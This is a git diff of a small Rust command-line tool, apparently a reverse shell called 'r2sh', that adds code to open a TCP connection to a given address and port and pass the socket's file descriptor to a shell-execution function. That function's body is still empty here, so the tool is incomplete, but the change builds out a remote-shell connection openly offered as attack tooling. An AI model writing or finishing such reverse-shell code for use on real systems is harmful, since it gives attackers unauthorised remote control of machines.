@@ -1,7 +1,10 @@
 extern crate getopts;
 
 use std::env::args;
+use std::net::TcpStream;
+use std::os::unix::io::AsRawFd;
 use std::process::exit;
+
 use getopts::Options;
 
 struct R2shCtx {
@@ -47,14 +50,22 @@ fn parse_args() -> Option<R2shCtx> {
     Some(R2shCtx{ addr, port })
 }
 
-fn exec_shell(_fd: i8) {
+fn exec_shell(_fd: i32) {
 
 }
 
-fn run(_ctx: R2shCtx) -> i32 {
-    exec_shell(0);
+fn run(ctx: R2shCtx) {
+    println!("[+] trying to connect to server...");
 
-    return 0;  // normally never reached
+    let conn = TcpStream::connect(format!("{}:{}", ctx.addr, ctx.port));
+
+    match conn {
+        Ok(sock) => {
+            println!("[+] connection established!");
+            exec_shell(sock.as_raw_fd())
+        },
+        Err(_) => panic!("[-] fail to connect to server!")
+    }
 }
 
 fn main() {
@@ -63,6 +74,5 @@ fn main() {
         None => exit(1)
     };
 
-    let ret = run(ctx);
-    exit(ret);
+    run(ctx);
 }
